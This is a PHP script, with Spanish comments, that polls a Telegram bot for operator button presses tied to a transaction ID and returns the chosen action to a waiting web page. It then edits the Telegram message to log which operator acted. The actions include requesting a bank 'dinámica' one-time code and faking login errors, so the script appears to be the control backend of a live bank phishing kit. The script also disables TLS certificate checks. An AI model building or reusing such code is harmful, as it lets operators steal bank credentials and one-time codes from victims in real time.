<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$action = null;

// Verificar si ya hay acción en sesión
if (
    isset($_SESSION['current_transaction'], $_SESSION['current_action']) &&
    $_SESSION['current_transaction'] === $transactionId
) {
    $action = $_SESSION['current_action'];

    unset($_SESSION['current_transaction']);
    unset($_SESSION['current_action']);
}

// Si no hay acción, buscar en Telegram
if (!$action) {
    $offset = $_SESSION['last_update_id'] ?? 0;

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);

    if (!empty($data['ok']) && isset($data['result'])) {
        foreach ($data['result'] as $update) {
            if (
                isset($update['callback_query']['data']) &&
                strpos($update['callback_query']['data'], $transactionId) !== false
            ) {
                // Marcar el update como procesado
                $_SESSION['last_update_id'] = $update['update_id'];

                $callbackData = $update['callback_query']['data'];
                $parts = explode(':', $callbackData);

                if (count($parts) === 2) {
                    $actionType = $parts[0];
                    $validActions = ['error_logo', 'error_cajero', 'pedir_dinamica', 'error_dinamica', 'confirm_finalizar'];

                    if (in_array($actionType, $validActions)) {
                        $action = $actionType;

                        $from = $update['callback_query']['from'] ?? [];
                        $operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
                        if (empty($operador)) $operador = 'Operador';

                        $origText = $update['callback_query']['message']['text'] ?? '';
                        if ($origText !== '') {
                            $newText  = $origText;
                            $newText .= "\n\n————————————\n";
                            $newText .= "✅ Acción: <b>{$actionType}</b>\n";
                            $newText .= "👤 Operador: <b>{$operador}</b>";

                            $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                            curl_setopt($ch, CURLOPT_POST, true);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                                'chat_id' => $config['chat_id'],
                                'message_id' => $messageId,
                                'text' => $newText,
                                'parse_mode' => 'HTML',
                                'reply_markup' => json_encode(['inline_keyboard' => []])
                            ]));
                            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                            curl_exec($ch);
                            curl_close($ch);
                        }
                    }
                }

                break;
            }
        }
    }
}

// Devolver resultado
echo json_encode(['action' => $action]);
